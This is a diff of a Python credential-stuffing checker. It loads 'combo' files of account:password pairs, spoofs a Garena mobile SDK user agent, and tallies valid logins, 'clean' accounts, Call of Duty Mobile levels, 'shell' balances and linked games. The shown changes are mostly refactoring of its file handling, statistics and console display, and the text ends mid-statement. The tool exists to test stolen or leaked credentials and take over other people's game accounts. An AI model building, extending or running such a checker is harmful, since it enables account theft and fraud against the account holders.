+GAME_DISPLAY_NAMES = [('CODM', 'CODM'), ('FREEFIRE', 'Free Fire'), ('ROV', 'ROV'), ('DELTA FORCE', 'Delta Force'), ('AOV', 'AOV'), ('SPEED DRIFTERS', 'Speed Drifters'), ('BLACK CLOVER M', 'Black Clover M'), ('GARENA UNDAWN', 'Undawn'), ('FC ONLINE', 'FC Online'), ('FC ONLINE M', 'FC Online M'), ('MOONLIGHT BLADE', 'Moonlight Blade'), ('FAST THRILL', 'Fast Thrill'), ('THE WORLD OF WAR', 'World of War')]
+OAUTH_MAX_RETRIES = 3
+OAUTH_RETRY_DELAY = 0.3
 
-maps = {
-    'CODM': 'CODM.txt',
-    'FREEFIRE': 'FreeFire.txt',
-    'FREE FIRE': 'FreeFire.txt',
-    'ROV': 'ROV.txt',
-    'DELTA FORCE': 'DeltaForce.txt',
-    'AOV': 'AOV.txt',
-    'SPEED DRIFTERS': 'SpeedDrifters.txt',
-    'BLACK CLOVER M': 'BlackCloverM.txt',
-    'GARENA UNDAWN': 'Undawn.txt',
-    'FC ONLINE': 'FCOnline.txt',
-    'FC ONLINE M': 'FCOnlineM.txt',
-    'MOONLIGHT BLADE': 'MoonlightBlade.txt',
-    'FAST THRILL': 'FastThrill.txt',
-    'THE WORLD OF WAR': 'WorldOfWar.txt'
-}
-
-names = [
-    ('CODM', 'CODM'),
-    ('FREEFIRE', 'Free Fire'),
-    ('ROV', 'ROV'),
-    ('DELTA FORCE', 'Delta Force'),
-    ('AOV', 'AOV'),
-    ('SPEED DRIFTERS', 'Speed Drifters'),
-    ('BLACK CLOVER M', 'Black Clover M'),
-    ('GARENA UNDAWN', 'Undawn'),
-    ('FC ONLINE', 'FC Online'),
-    ('FC ONLINE M', 'FC Online M'),
-    ('MOONLIGHT BLADE', 'Moonlight Blade'),
-    ('FAST THRILL', 'Fast Thrill'),
-    ('THE WORLD OF WAR', 'World of War')
-]
-
-retries = 3
-delay = 2
-
-ua = (
-    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
-    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
-    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
+MSDK_UA = (
+    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
 )
+MSDK_SEC_CH_UA = '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"'
 
-chua = '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"'
-
-class Vault:
+class AccountFileManager:
 
     def __init__(self, combo_folder='Combo'):
         self.combo_folder = Path(combo_folder)
         self.combo_folder.mkdir(exist_ok=True)
-        self.lock = threading.Lock()
+        self._file_lock = threading.Lock()
 
-    def scan(self):
+    def scan_combo_folder(self):
         return list(self.combo_folder.glob('*.txt'))
 
-    def probe(self, file_path):
+    def get_file_info(self, file_path):
         file_path = Path(file_path)
         try:
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                lines = [
-                    line.strip()
-                    for line in f
-                    if line.strip() and ':' in line
-                ]
-                count = len(lines)
-            size = file_path.stat().st_size
-            return {
-                'name': file_path.name,
-                'path': str(file_path),
-                'size': size,
-                'sized': self.scale(size),
-                'count': count
-            }
-        except Exception:
+                lines = [line.strip() for line in f if line.strip() and ':' in line]
+                account_count = len(lines)
+            file_size = file_path.stat().st_size
+            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
+        except Exception as e:
             logger.error(f'Error reading file {file_path}')
             return None
 
-    def scale(self, size):
+    def _format_size(self, size_bytes):
         for unit in ['B', 'KB', 'MB', 'GB']:
-            if size < 1024.0:
-                return f'{size:.2f} {unit}'
-            size /= 1024.0
-        return f'{size:.2f} TB'
+            if size_bytes < 1024.0:
+                return f'{size_bytes:.2f} {unit}'
+            size_bytes /= 1024.0
+        return f'{size_bytes:.2f} TB'
 
-    def cleanse(self, file_path):
+    def clean_file_encoding(self, file_path):
         file_path = Path(file_path)
         try:
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 lines = f.readlines()
-            cleaned = []
-            invalid = 0
+            cleaned_lines = []
+            invalid_count = 0
             for line in lines:
-                account, password = pare(line)
+                account, password = clean_account_line(line)
                 if account and password:
-                    cleaned.append(f'{account}:{password}\n')
+                    cleaned_lines.append(f'{account}:{password}\n')
                 else:
-                    invalid += 1
+                    invalid_count += 1
             with open(file_path, 'w', encoding='utf-8') as f:
-                f.writelines(cleaned)
-            return (len(cleaned), invalid)
-        except Exception:
-            logger.error('Error cleaning file encoding')
+                f.writelines(cleaned_lines)
+            return (len(cleaned_lines), invalid_count)
+        except Exception as e:
+            logger.error(f'Error cleaning file encoding')
             return (0, 0)
 
-    def dedupe(self, file_path, overwrite=True):
+    def clean_duplicates(self, file_path, overwrite=True):
         file_path = Path(file_path)
         try:
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 lines = [line.strip() for line in f if line.strip()]
-            before = len(lines)
-            unique = list(dict.fromkeys(lines))
-            removed = before - len(unique)
+            original_count = len(lines)
+            unique_lines = list(dict.fromkeys(lines))
+            duplicates_removed = original_count - len(unique_lines)
             if overwrite:
                 with open(file_path, 'w', encoding='utf-8') as f:
-                    f.write('\n'.join(unique))
+                    f.write('\n'.join(unique_lines))
             else:
                 new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                 with open(new_path, 'w', encoding='utf-8') as f:
-                    f.write('\n'.join(unique))
-            return removed
-        except Exception:
-            logger.error('Error cleaning duplicates')
+                    f.write('\n'.join(unique_lines))
+            return duplicates_removed
+        except Exception as e:
+            logger.error(f'Error cleaning duplicates')
             return 0
 
-    def excise(self, file_path, line_to_remove):
+    def remove_line_from_file(self, file_path, line_to_remove):
         try:
             file_path = Path(file_path)
             target = line_to_remove.strip()
-            with self.lock:
+            with self._file_lock:
                 with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                     lines = f.readlines()
                 with open(file_path, 'w', encoding='utf-8') as f:
@@ -432,246 +486,191 @@ class Vault:
                         if line.strip() != target:
                             f.write(line)
             return True
-        except Exception:
-            logger.error('Error removing line')
+        except Exception as e:
+            logger.error(f'Error removing line')
             return False
 
-class Lens:
+class AccountFileViewer:
     def __init__(self):
         self.console = Console()
 
-    def board(self, file_infos):
+    def display_file_table(self, file_infos):
+        # rriell-style: combo-file table wrapped in a rounded Panel.
         print()
-        table = Table(
-            box=box.HORIZONTALS,
-            header_style="bold bright_magenta",
-            border_style="bright_magenta",
-            padding=(0, 2)
-        )
-        table.add_column("#", style="bright_magenta", justify="center")
+        table = Table(box=box.SIMPLE_HEAD, header_style="bold bright_cyan",
+                      border_style="dim", padding=(0, 2))
+        table.add_column("#",        style="bold bright_cyan", justify="right", width=3)
         table.add_column("Filename", style="bold white")
-        table.add_column("Size", style="white", justify="right")
-        table.add_column("Accounts", style="white", justify="right")
-        table.add_column("Bar", style="bright_magenta")
-        max_ac = max((i['count'] for i in file_infos)) if file_infos else 1
+        table.add_column("Size",     style="yellow",      justify="right")
+        table.add_column("Accounts", style="bright_green", justify="right")
+        table.add_column("Bar",      style="bright_cyan", width=18)
+        max_ac = max((i['account_count'] for i in file_infos)) if file_infos else 1
         for idx, info in enumerate(file_infos, 1):
             bar_w = 16
-            filled = int(info['count'] / max_ac * bar_w)
-            bar = (
-                f"[bright_magenta]{'█' * filled}[/bright_magenta]"
-                f"[dim white]{'░' * (bar_w - filled)}[/dim white]"
-            )
-            table.add_row(
-                str(idx),
-                info['name'],
-                info['sized'],
-                f"{info['count']:,}",
-                bar
-            )
-        panel = Panel(
-            table,
-            title="[bold white]COMBO FILES[/bold white]",
-            box=box.DOUBLE_EDGE,
-            border_style="bright_magenta",
-            expand=False
-        )
-        self.console.print(Padding(panel, (0, 0, 0, 4)))
+            filled = int(info['account_count'] / max_ac * bar_w)
+            bar = f"[bright_cyan]{'█' * filled}[/bright_cyan][dim]{'░' * (bar_w - filled)}[/dim]"
+            table.add_row(str(idx), info['name'], info['size_str'],
+                          f"{info['account_count']:,}", bar)
+        from rich.padding import Padding
+        self.console.print(Padding(
+            Panel(table,
+                  title='[bold bright_cyan]📂 COMBO FILES[/bold bright_cyan]',
+                  border_style='bright_cyan', box=box.ROUNDED, expand=False),
+            (0, 0, 0, 2)))
         print()
 
-    def choose(self, file_infos):
+    def _ask_panel(self, body, title, border, prompt_color='96'):
+        from rich.padding import Padding
+        self.console.print(Padding(
+            Panel(body,
+                  title=f'[bold {border}]{title}[/bold {border}]',
+                  border_style=border, box=box.ROUNDED, expand=False),
+            (0, 0, 0, 2)))
+        return input(f"        \033[{prompt_color}m❯\033[0m ").strip().lower()
+
+    def prompt_file_selection(self, file_infos):
         while True:
-            prompt_panel = Panel(
-                "[white]Enter file number or 'auto'[/white]",
-                title="[bright_magenta]❯ Input[/bright_magenta]",
-                border_style="bright_magenta",
-                box=box.ROUNDED,
-                expand=False
-            )
-            self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
-            choice = input("        ❯ ").strip().lower()
+            choice = self._ask_panel(
+                "[white]Enter file number or [bright_yellow]'auto'[/bright_yellow] to pick the largest[/white]",
+                '❯ Select File', 'bright_cyan', '96')
             if choice == 'auto':
-                largest = max(file_infos, key=lambda x: x['count'])
-                herald('SUCCESS', f"Auto-selected: {largest['name']}", '    ')
+                largest = max(file_infos, key=lambda x: x['account_count'])
+                _log('SUCCESS', f"Auto-selected: {largest['name']}")
                 return largest['path']
             try:
                 idx = int(choice)
                 if 1 <= idx <= len(file_infos):
                     return file_infos[idx - 1]['path']
-                herald('ERROR', 'Invalid number — try again.', '    ')
+                _log('ERROR', 'Invalid number — try again.')
             except ValueError:
-                herald('ERROR', "Enter a number or 'auto'.", '    ')
+                _log('ERROR', "Enter a number or 'auto'.")
 
-    def ask_clean(self):
+    def prompt_clean_file(self):
         print()
-        prompt_panel = Panel(
-            "[white]Clean file encoding? (y/n) [default: y][/white]",
-            title="[bright_magenta]❯ Question[/bright_magenta]",
-            border_style="bright_magenta",
-            box=box.ROUNDED,
-            expand=False
-        )
-        self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
-        choice = input("        ❯ ").strip().lower()
-        return choice != 'n'
+        return self._ask_panel(
+            '[white]Clean file encoding? [dim](Y/n)[/dim][/white]',
+            '❯ Encoding', 'bright_cyan', '96') != 'n'
 
-    def ask_dedupe(self):
-        prompt_panel = Panel(
-            "[white]Remove duplicate lines? (y/n) [default: n][/white]",
-            title="[bright_magenta]❯ Question[/bright_magenta]",
-            border_style="bright_magenta",
-            box=box.ROUNDED,
-            expand=False
-        )
-        self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
-        choice = input("        ❯ ").strip().lower()
-        return choice == 'y'
+    def prompt_remove_duplicates(self):
+        return self._ask_panel(
+            '[white]Remove duplicate lines? [dim](y/N)[/dim][/white]',
+            '❯ Deduplicate', 'bright_green', '92') == 'y'
 
-    def ask_auto(self):
-        prompt_panel = Panel(
-            "[white]Auto-remove checked lines? (y/n) [default: n][/white]",
-            title="[bright_magenta]❯ Question[/bright_magenta]",
-            border_style="bright_magenta",
-            box=box.ROUNDED,
-            expand=False
-        )
-        self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
-        choice = input("        ❯ ").strip().lower()
-        return choice == 'y'
+    def prompt_auto_remove_checked(self):
+        return self._ask_panel(
+            '[white]Auto-remove checked lines? [dim](y/N)[/dim][/white]',
+            '❯ Auto-Remove', 'bright_yellow', '93') == 'y'
 
-class Ledger:
+class LiveStats:
     def __init__(self):
-        self.valid = 0
-        self.invalid = 0
-        self.clean = 0
-        self.unclean = 0
-        self.codm = 0
-        self.nocodm = 0
-        self.error = 0
-        self.tclean = 0
-        self.tunclean = 0
-        self.tshell = 0
-        self.cleans = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
-        self.uncleans = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
+        self.valid_count = self.invalid_count = self.clean_count = self.not_clean_count = 0
+        self.has_codm_count = self.no_codm_count = self.error_count = 0
+        self.highest_clean_level = self.highest_not_clean_level = self.highest_shell = 0
+        self.clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
+        self.not_clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
         self.lock = threading.Lock()
-        self.started = time.time()
-        self.total = 0
-        self.games = {k: 0 for k, _ in names}
-        self.results = deque(maxlen=200)
+        self.start_time = time.time()
+        self.total_accounts = 0
+        self.game_counts = {k:0 for k,_ in GAME_DISPLAY_NAMES}
+        self.last_result_queue = deque(maxlen=200)
 
-    def accrue(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
+    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
         with self.lock:
             if is_error:
-                self.error += 1
+                self.error_count += 1
             elif valid:
-                self.valid += 1
+                self.valid_count += 1
                 if clean:
-                    self.clean += 1
-                    if codm_level > self.tclean:
-                        self.tclean = codm_level
+                    self.clean_count += 1
+                    if codm_level > self.highest_clean_level:
+                        self.highest_clean_level = codm_level
                     if has_codm and codm_level > 0:
                         if codm_level <= 100:
-                            self.cleans['1-100'] += 1
+                            self.clean_level_counts['1-100'] += 1
                         elif codm_level <= 200:
-                            self.cleans['101-200'] += 1
+                            self.clean_level_counts['101-200'] += 1
                         elif codm_level <= 350:
-                            self.cleans['201-350'] += 1
+                            self.clean_level_counts['201-350'] += 1
                         else:
-                            self.cleans['351-400'] += 1
+                            self.clean_level_counts['351-400'] += 1
                 else:
-                    self.unclean += 1
+                    self.not_clean_count += 1
                     if has_codm and codm_level > 0:
-                        if codm_level > self.tunclean:
-                            self.tunclean = codm_level
+                        if codm_level > self.highest_not_clean_level:
+                            self.highest_not_clean_level = codm_level
                         if codm_level <= 100:
-                            self.uncleans['1-100'] += 1
+                            self.not_clean_level_counts['1-100'] += 1
                         elif codm_level <= 200:
-                            self.uncleans['101-200'] += 1
+                            self.not_clean_level_counts['101-200'] += 1
                         elif codm_level <= 350:
-                            self.uncleans['201-350'] += 1
+                            self.not_clean_level_counts['201-350'] += 1
                         else:
-                            self.uncleans['351-400'] += 1
+                            self.not_clean_level_counts['351-400'] += 1
                 if has_codm:
-                    self.codm += 1
+                    self.has_codm_count += 1
                 else:
-                    self.nocodm += 1
+                    self.no_codm_count += 1
                 try:
-                    if int(shell or 0) > self.tshell:
-                        self.tshell = int(shell or 0)
+                    if int(shell or 0) > self.highest_shell:
+                        self.highest_shell = int(shell or 0)
                 except:
                     pass
                 for g in game_connections or []:
-                    gname = g.get('game', '').upper()
+                    gname = g.get('game','').upper()
                     if gname == 'FREE FIRE':
                         gname = 'FREEFIRE'
-                    if gname in self.games:
-                        self.games[gname] += 1
+                    if gname in self.game_counts:
+                        self.game_counts[gname] += 1
             else:
-                self.invalid += 1
+                self.invalid_count += 1
 
-    def snapshot(self):
+    def get_stats(self):
         with self.lock:
-            return {
-                'valid': self.valid,
-                'invalid': self.invalid,
-                'clean': self.clean,
-                'not_clean': self.unclean,
-                'has_codm': self.codm,
-                'no_codm': self.nocodm,
-                'error': self.error,
-                'highest_clean_level': self.tclean,
-                'clean_level_counts': dict(self.cleans),
-                'not_clean_level_counts': dict(self.uncleans),
-                'game_counts': dict(self.games),
-                'highest_shell': self.tshell
-            }
+            return {'valid':self.valid_count,'invalid':self.invalid_count,'clean':self.clean_count,
+                    'not_clean':self.not_clean_count,'has_codm':self.has_codm_count,
+                    'no_codm':self.no_codm_count,'error':self.error_count,
+                    'highest_clean_level':self.highest_clean_level,
+                    'clean_level_counts':dict(self.clean_level_counts),
+                    'not_clean_level_counts':dict(self.not_clean_level_counts),
+                    'game_counts':dict(self.game_counts),'highest_shell':self.highest_shell}
 
-    def tally(self):
+    def get_processed_count(self):
         with self.lock:
-            return self.valid + self.invalid + self.error
+            return self.valid_count + self.invalid_count + self.error_count
 
-    def push(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = '', shell_balance: int = 0):
+    def push_result(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = '', shell_balance: int = 0):
         with self.lock:
-            self.results.append({
-                'success': success,
-                'is_clean': is_clean,
-                'has_codm': has_codm,
-                'codm_level': codm_level,
-                'error_reason': error_reason,
-                'shell_balance': shell_balance
-            })
+            self.last_result_queue.append({'success':success,'is_clean':is_clean,'has_codm':has_codm,'codm_level':codm_level,'error_reason':error_reason,'shell_balance':shell_balance})
 
-    def pop(self):
+    def pop_result(self):
         with self.lock:
-            return self.results.popleft() if self.results else None
+            return self.last_result_queue.popleft() if self.last_result_queue else None
 
-    def bar(self, count: int, denom: int, color: str, width: int = 20) -> Text:
+    def _rich_bar(self, count: int, denom: int, color: str, width: int = 20) -> Text:
         if denom == 0:
             return Text("░" * width, style="dim")
         filled = int(count / denom * width)
-        b = Text()
-        b.append("█" * filled, style=color)
-        b.append("░" * (width - filled), style="dim")
-        return b
+        bar = Text()
+        bar.append("█" * filled, style=color)
+        bar.append("░" * (width - filled), style="dim")
+        return bar
 
-    def percent(self, count: int, denom: int) -> str:
+    def _rich_pct(self, count: int, denom: int) -> str:
         return f"{count / denom * 100:.1f}%" if denom > 0 else "0.0%"
 
-    def report(self):
-        stats = self.snapshot()
-        processed = self.tally()
+    def display_stats(self):
+        stats = self.get_stats()
+        processed = self.get_processed_count()
         if processed == 0:
             return ''
-        elapsed = time.time() - self.started
+        elapsed = time.time() - self.start_time
         rate = processed / elapsed if elapsed > 0 else 0
-        remaining = self.total - processed
+        remaining = self.total_accounts - processed
         eta = remaining / rate if rate > 0 else 0
-        pct = processed / self.total * 100 if self.total > 0 else 0
+        pct = processed / self.total_accounts * 100 if self.total_accounts > 0 else 0
         bar_w = 30
         filled = int(pct / 100 * bar_w)
-        prog_bar = (
-            f"[bright_cyan]{'█' * filled}[/bright_cyan]"
-            f"[dim]{'░' * (bar_w - filled)}[/dim]"
-        )
+        prog_bar = f"[cyan]{'█' * filled}[/cyan][dim]{'░' * (bar_w - filled)}[/dim]"
 
         def _mb(count, total, color, w=12):
             if total == 0:
@@ -683,174 +682,67 @@ class Ledger:
         tbl.add_column(style='dim', min_width=6, no_wrap=True)
         tbl.add_column(style='bright_white', min_width=8, no_wrap=True, justify='right')
         tbl.add_column(style='dim', min_width=14, no_wrap=True)
-        tbl.add_row(
-            f'[bright_cyan]{prog_bar}[/bright_cyan]',
-            f'[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]',
-            f'[dim]{processed}/{self.total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s[/dim]'
-        )
+        tbl.add_row(f'[cyan]{prog_bar}[/cyan]', f'[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]', f'[dim]{processed}/{self.total_accounts}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s[/dim]')
         tbl.add_row('', '', '')
         total_c = stats['valid'] + stats['invalid']
-        tbl.add_row(
-            f'[bright_green]✔ Valid[/bright_green]',
-            f"[bright_green]{stats['valid']}[/bright_green]",
-            _mb(stats['valid'], total_c, 'bright_magenta')
-        )
-        tbl.add_row(
-            f'[bright_red]✖ Invalid[/bright_red]',
-            f"[bright_red]{stats['invalid']}[/bright_red]",
-            _mb(stats['invalid'], total_c, 'bright_red')
-        )
-        tbl.add_row(
-            f'[bright_green]✨ Clean[/bright_green]',
-            f"[bright_green]{stats['clean']}[/bright_green]",
-            _mb(stats['clean'], max(stats['valid'], 1), 'bright_magenta')
-        )
-        tbl.add_row(
-            f'[yellow]⊘ Not Clean[/yellow]',
-            f"[yellow]{stats['not_clean']}[/yellow]",
-            _mb(stats['not_clean'], max(stats['valid'], 1), 'yellow')
-        )
-        tbl.add_row(
-            f'[bright_cyan]◈ CODM[/bright_cyan]',
-            f"[bright_cyan]{stats['has_codm']}[/bright_cyan]",
-            _mb(stats['has_codm'], max(stats['valid'], 1), 'bright_magenta')
-        )
-        tbl.add_row(
-            f'[dim]○ No CODM[/dim]',
-            f"[dim]{stats['no_codm']}[/dim]",
-            _mb(stats['no_codm'], max(stats['valid'], 1), 'magenta')
-        )
+        tbl.add_row(f'[bright_green]✔ Valid[/bright_green]', f"[bright_green]{stats['valid']}[/bright_green]", _mb(stats['valid'], total_c, 'bright_cyan'))
+        tbl.add_row(f'[bright_red]✖ Invalid[/bright_red]', f"[bright_red]{stats['invalid']}[/bright_red]", _mb(stats['invalid'], total_c, 'bright_red'))
+        tbl.add_row(f'[bright_green]✨ Clean[/bright_green]', f"[bright_green]{stats['clean']}[/bright_green]", _mb(stats['clean'], max(stats['valid'], 1), 'bright_cyan'))
+        tbl.add_row(f'[yellow]⊘ Not Clean[/yellow]', f"[yellow]{stats['not_clean']}[/yellow]", _mb(stats['not_clean'], max(stats['valid'], 1), 'yellow'))
+        tbl.add_row(f'[cyan]◈ CODM[/cyan]', f"[cyan]{stats['has_codm']}[/cyan]", _mb(stats['has_codm'], max(stats['valid'], 1), 'bright_cyan'))
+        tbl.add_row(f'[dim]○ No CODM[/dim]', f"[dim]{stats['no_codm']}[/dim]", _mb(stats['no_codm'], max(stats['valid'], 1), 'color(139)'))
         tbl.add_row('', '', '')
-        tbl.add_row(
-            f'[dim]▲ Top Clean Lv[/dim]',
-            f"[bold bright_green]{stats['highest_clean_level']}[/bold bright_green]",
-            ''
-        )
-        tbl.add_row(
-            f'[dim]▲ Top Not Clean Lv[/dim]',
-            f'[bold yellow]{self.tunclean}[/bold yellow]',
-            ''
-        )
+        tbl.add_row(f'[dim]▲ Top Clean Lv[/dim]', f"[bold bright_green]{stats['highest_clean_level']}[/bold bright_green]", '')
+        tbl.add_row(f'[dim]▲ Top Not Clean Lv[/dim]', f'[bold yellow]{self.highest_not_clean_level}[/bold yellow]', '')
         hs = stats.get('highest_shell', 0)
         hs_color = 'bold bright_yellow' if hs > 0 else 'dim'
-        tbl.add_row(
-            f'[dim]◆ Shell[/dim]',
-            f'[{hs_color}]{hs:,}[/{hs_color}]',
-            ''
-        )
+        tbl.add_row(f'[dim]◆ Shell[/dim]', f'[{hs_color}]{hs:,}[/{hs_color}]', '')
         gc = stats.get('game_counts', {})
-        active_games = [
-            (label_name, gc.get(key, 0))
-            for key, label_name in names
-            if gc.get(key, 0) > 0
-        ]
+        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
         if active_games:
             tbl.add_row('', '', '')
-            for label_name, count in active_games:
-                tbl.add_row(
-                    f'[dim]{label_name}[/dim]',
-                    f'[bold bright_magenta]{count}[/bold bright_magenta]',
-                    ''
-                )
-        return Panel(
-            tbl,
-            title='[bold bright_magenta]◈ [/bold bright_magenta][bold bright_cyan]rriellqt[/bold bright_cyan][bold bright_magenta] ◈[/bold bright_magenta]',
-            border_style='bright_magenta',
-            box=DOUBLE,
-            padding=(0, 2)
-        )
+            for label, count in active_games:
+                tbl.add_row(f'[dim]{label}[/dim]', f'[bold bright_cyan]{count}[/bold bright_cyan]', '')
+        return Panel(tbl, title='[bold bright_cyan]◈ [/bold bright_cyan][bold cyan]Hesu[/bold cyan][bold bright_cyan] ◈[/bold bright_cyan]', border_style='bright_cyan', box=DOUBLE, padding=(0, 2))
 
-    def finish(self):
-        stats = self.snapshot()
-        elapsed = time.time() - self.started
-        total = self.total
-        proc = self.tally()
+    def display_final_stats(self):
+        stats = self.get_stats()
+        elapsed = time.time() - self.start_time
+        total = self.total_accounts
+        proc = self.get_processed_count()
         rate = proc / elapsed if elapsed > 0 else 0
-        c = Console()
+        console = Console()
 
-        results_table = Table(
-            title="[bold bright_cyan]◈ SESSION COMPLETE[/bold bright_cyan]",
-            title_style="bold bright_cyan",
-            box=DOUBLE,
-            border_style="bright_cyan",
-            show_header=True,
-            header_style="bold dim",
-            padding=(0, 2),
-            expand=False
-        )
+        results_table = Table(title="[bold bright_cyan]◈ SESSION COMPLETE[/bold bright_cyan]", title_style="bold bright_cyan", box=DOUBLE, border_style="bright_cyan", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
         results_table.add_column("Category", style="dim", no_wrap=True, width=14)
         results_table.add_column("Count", justify="right", style="bright_white", width=10)
         results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
         results_table.add_column("Bar", no_wrap=True)
 
         denom = max(total, 1)
-        rows = [
-            ("✔  Valid", stats['valid'], "bright_green"),
-            ("✖  Invalid", stats['invalid'], "bright_red"),
-            ("·  Errors", stats['error'], "dim")
-        ]
-        for label_name, count, color in rows:
-            results_table.add_row(
-                f"[{color}]{label_name}[/{color}]",
-                f"[{color}]{count:,}[/{color}]",
-                self.percent(count, denom),
-                self.bar(count, denom, color, 20)
-            )
+        for label, count, color in [("✔  Valid", stats['valid'], "bright_green"), ("✖  Invalid", stats['invalid'], "bright_red"), ("·  Errors", stats['error'], "dim")]:
+            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, denom), self._rich_bar(count, denom, color, 20))
         results_table.add_row("", "", "", "")
 
         vd = max(stats['valid'], 1)
-        rows2 = [
-            ("✨  Clean", stats['clean'], "bright_green"),
-            ("⊘  Not Clean", stats['not_clean'], "bright_yellow"),
-            ("◈  Has CODM", stats['has_codm'], "bright_cyan"),
-            ("○  No CODM", stats['no_codm'], "magenta")
-        ]
-        for label_name, count, color in rows2:
-            results_table.add_row(
-                f"[{color}]{label_name}[/{color}]",
-                f"[{color}]{count:,}[/{color}]",
-                self.percent(count, vd),
-                self.bar(count, vd, color, 20)
-            )
+        for label, count, color in [("✨  Clean", stats['clean'], "bright_green"), ("⊘  Not Clean", stats['not_clean'], "bright_yellow"), ("◈  Has CODM", stats['has_codm'], "cyan"), ("○  No CODM", stats['no_codm'], "color(139)")]:
+            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, vd), self._rich_bar(count, vd, color, 20))
 
-        c.print(Panel(results_table, border_style="bright_cyan", box=HEAVY, padding=(0, 1)))
+        console.print(Panel(results_table, border_style="bright_cyan", box=ROUNDED, padding=(0, 1)))
 
-        stats_table = Table(
-            title="[bold bright_yellow]◈ SESSION STATS[/bold bright_yellow]",
-            box=ROUNDED,
-            border_style="bright_yellow",
-            show_header=False,
-            padding=(0, 2),
-            expand=False
-        )
+        stats_table = Table(title="[bold bright_yellow]◈ SESSION STATS[/bold bright_yellow]", box=ROUNDED, border_style="bright_yellow", show_header=False, padding=(0, 2), expand=False)
         stats_table.add_column(style="dim", width=16, no_wrap=True)
         stats_table.add_column(style="bright_white", no_wrap=True)
 
         hs = stats.get('highest_shell', 0)
         hs_style = "bold bright_yellow" if hs > 0 else "dim"
         clean_lvl_style = "bold bright_green" if stats['highest_clean_level'] > 0 else "dim"
-        not_clean_lvl_style = "bold bright_yellow" if self.tunclean > 0 else "dim"
+        not_clean_lvl_style = "bold bright_yellow" if self.highest_not_clean_level > 0 else "dim"
 
-        rows3 = [
-            ("⏱  Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s"),
-            ("⚡  Rate", f"{rate:.2f} acc/s"),
-            ("◈  Processed", f"{proc:,}/{total:,}"),
-            ("▲  Top Clean", f"[{clean_lvl_style}]{stats['highest_clean_level']}[/{clean_lvl_style}]"),
-            ("▲  Top Not Clean", f"[{not_clean_lvl_style}]{self.tunclean}[/{not_clean_lvl_style}]"),
-            ("◆  Peak Shell", f"[{hs_style}]{hs:,}[/{hs_style}]")
-        ]
-        for label_name, val in rows3:
-            stats_table.add_row(label_name, val)
+        for label, val in [("⏱  Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s"), ("⚡  Rate", f"{rate:.2f} acc/s"), ("◈  Processed", f"{proc:,}/{total:,}"), ("▲  Top Clean", f"[{clean_lvl_style}]{stats['highest_clean_level']}[/{clean_lvl_style}]"), ("▲  Top Not Clean", f"[{not_clean_lvl_style}]{self.highest_not_clean_level}[/{not_clean_lvl_style}]"), ("◆  Peak Shell", f"[{hs_style}]{hs:,}[/{hs_style}]")]:
+            stats_table.add_row(label, val)
 
-        level_table = Table(
-            title="[bold bright_magenta]◈ LEVEL RANGES[/bold bright_magenta]",
-            box=ROUNDED,
-            border_style="bright_magenta",
-            show_header=True,
-            header_style="bold dim",
-            padding=(0, 1),
-            expand=False
-        )
+        level_table = Table(title="[bold cyan]◈ LEVEL RANGES[/bold cyan]", box=ROUNDED, border_style="cyan", show_header=True, header_style="bold dim", padding=(0, 1), expand=False)
         level_table.add_column("Range", style="dim", no_wrap=True, width=10)
         level_table.add_column("Clean", justify="right", style="bright_green", width=8)
         level_table.add_column("Bar", no_wrap=True)
@@ -865,104 +757,116 @@ class Ledger:
         for rng in ['351-400', '201-350', '101-200', '1-100']:
             cc = clean_lvl.get(rng, 0)
             nc = not_clean_lvl.get(rng, 0)
-            level_table.add_row(
-                f"[dim]Lv {rng}[/dim]",
-                f"{cc:,}",
-                self.bar(cc, ct, "bright_green", 12),
-                f"{nc:,}",
-                self.bar(nc, nt, "bright_yellow", 12)
-            )
+            level_table.add_row(f"[dim]Lv {rng}[/dim]", f"{cc:,}", self._rich_bar(cc, ct, "bright_green", 12), f"{nc:,}", self._rich_bar(nc, nt, "bright_yellow", 12))
 
-        stats_levels = Columns(
-            [stats_table, level_table],
-            expand=False,
